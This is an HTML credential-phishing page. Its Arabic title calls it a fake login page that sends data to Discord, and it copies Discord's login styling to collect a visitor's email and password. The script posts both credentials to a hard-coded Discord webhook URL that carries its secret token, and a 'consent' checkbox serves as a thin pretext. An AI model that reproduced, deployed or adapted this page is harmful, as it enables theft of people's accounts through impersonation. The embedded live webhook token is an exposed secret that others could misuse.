<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8" />
  <title>صفحة دخول وهمية مع إرسال بيانات ديسكورد</title>
  <style>
    body {
      margin: 0;
      font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
      background-color: #36393f;
      color: #dcddde;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      direction: rtl;
    }

    .login-box {
      background-color: #2f3136;
      padding: 40px;
      border-radius: 8px;
      width: 400px;
      text-align: center;
      box-shadow: 0 0 15px rgba(0,0,0,0.4);
    }

    h2 {
      margin-bottom: 10px;
      color: #fff;
    }

    p {
      font-size: 14px;
      margin-bottom: 25px;
      color: #b9bbbe;
    }

    input {
      width: 100%;
      padding: 12px;
      margin-bottom: 15px;
      border: none;
      border-radius: 4px;
      background-color: #202225;
      color: #fff;
      font-size: 14px;
      box-sizing: border-box;
    }

    input:focus {
      outline: none;
      border: 1px solid #5865f2;
    }

    .btn {
      width: 100%;
      padding: 12px;
      background-color: #5865f2;
      border: none;
      border-radius: 4px;
      color: #fff;
      font-weight: bold;
      cursor: pointer;
      font-size: 15px;
      box-sizing: border-box;
    }

    .btn:hover {
      background-color: #4752c4;
    }

    .links {
      margin-top: 20px;
      font-size: 13px;
      color: #b9bbbe;
    }

    .links a {
      color: #00aff4;
      text-decoration: none;
    }

    .links a:hover {
      text-decoration: underline;
    }

    .consent-label {
      font-weight: normal;
      margin-top: 10px;
      display: flex;
      align-items: center;
      color: #b9bbbe;
    }

    .consent-label input {
      margin-left: 8px;
      width: auto;
    }
  </style>
</head>
<body>
  <div class="login-box">
    <h2>مرحباً مجدداً!</h2>
    <p>سجّل الدخول للمتابعة</p>
    <form id="loginForm">
      <input type="email" id="email" placeholder="البريد الإلكتروني" required />
      <input type="password" id="password" placeholder="كلمة المرور" required />
      <label class="consent-label">
        <input type="checkbox" id="consent" required />
        أوافق على مشاركة المعلومات
      </label>
      <button type="submit" class="btn">تسجيل الدخول</button>
    </form>
    <div class="links">
      <p>هل نسيت كلمة المرور؟ <a href="#">إعادة تعيين</a></p>
      <p>ليس لديك حساب؟ <a href="#">التسجيل</a></p>
    </div>
  </div>

  <script>
    const webhookURL = "https://discord.com/api/webhooks/1364438803170725899/9Zrvq7SXUIUIE8VEdazpPYtyc1qwDmaJufck8dEfC2w0xbc5TVktfzrb6vUJnPasaqDb";

    document.getElementById('loginForm').addEventListener('submit', function(event) {
      event.preventDefault();

      const email = document.getElementById('email').value.trim();
      const password = document.getElementById('password').value.trim();
      const consent = document.getElementById('consent').checked;

      if (!consent) {
        alert("يجب الموافقة على مشاركة المعلومات");
        return;
      }

      const message = {
        embeds: [
          {
            title: "تم استلام بيانات جديدة من الموقع",
            color: 7506394,
            fields: [
              { name: "البريد الإلكتروني", value: email, inline: false },
              { name: "كلمة السر", value: password, inline: false }
            ],
            timestamp: new Date().toISOString()
          }
        ]
      };

      fetch(webhookURL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(message)
      })
      .then(response => {
        if (response.ok) {
          alert('تم الإرسال بنجاح!');
          this.reset();
        } else {
          alert('فشل الإرسال، حاول مرة أخرى لاحقاً.');
        }
      })
      .catch(error => {
        alert('خطأ في الاتصال: ' + error.message);
      });
    });
  </script>
</body>
</html>
